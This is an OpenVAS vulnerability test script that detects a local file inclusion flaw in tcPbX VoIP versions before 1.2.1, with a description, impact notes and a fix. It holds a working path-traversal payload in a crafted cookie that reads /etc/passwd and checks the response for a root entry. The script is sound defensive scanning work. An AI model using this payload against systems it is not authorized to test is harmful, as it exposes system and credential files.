###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tcpbx_voip_lfi_vuln.nasl 11493 2018-09-20 09:02:35Z asteins $
#
# tcPbX 'tcpbx_lang' Parameter Local File Inclusion Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:tcpbx:tcpbx_voip";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809009");
  script_version("$Revision: 11493 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-20 11:02:35 +0200 (Thu, 20 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-08-23 16:18:17 +0530 (Tue, 23 Aug 2016)");
  script_name("tcPbX 'tcpbx_lang' Parameter Local File Inclusion Vulnerability");

  script_tag(name:"summary", value:"The host is running tcPbX VoIP phone system
  and is prone to local file disclosure vulnerability");

  script_tag(name:"vuldetect", value:"Send the crafted http GET request
  and check whether it is able to get password information or not.");

  script_tag(name:"insight", value:"The flaw exists due to 'tcpbx_lang'
  parameter isn't sanitized before being proceeded in the file
  'var/www/html/tcpbx/index.php'.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read any file system including file configurations.");

  script_tag(name:"affected", value:"tcPbX versions prior to 1.2.1.");

  script_tag(name:"solution", value:"Update to version 1.2.1 or later.
  For updates refer to http://www.tcpbx.org");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40278");
  script_xref(name:"URL", value:"http://www.tcpbx.org/index.php/en/resources/updates");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_tcpbx_voip_remote_detect.nasl");
  script_mandatory_keys("tcPbX/Installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!iqPort = get_app_port(cpe:CPE)){
  exit(0);
}

url = "/tcpbx/";

## Condtruct crafted cookie parameter
cookie = "tcpbx_lang=../../../../../../../../../../etc/passwd%00; PHPSESSID=7rmen68sn4op8cgkc49l86pfu4";

if(http_vuln_check(port:iqPort, url:url, check_header:TRUE,
   pattern:"root:.*:0:[01]:", cookie: cookie,
   extra_check:make_list(">www.tcpbx.org", "<title>tcPbX</title>")))
{
  report = report_vuln_url(port:iqPort, url:url);
  security_message(port:iqPort, data:report);
  exit(0);
}

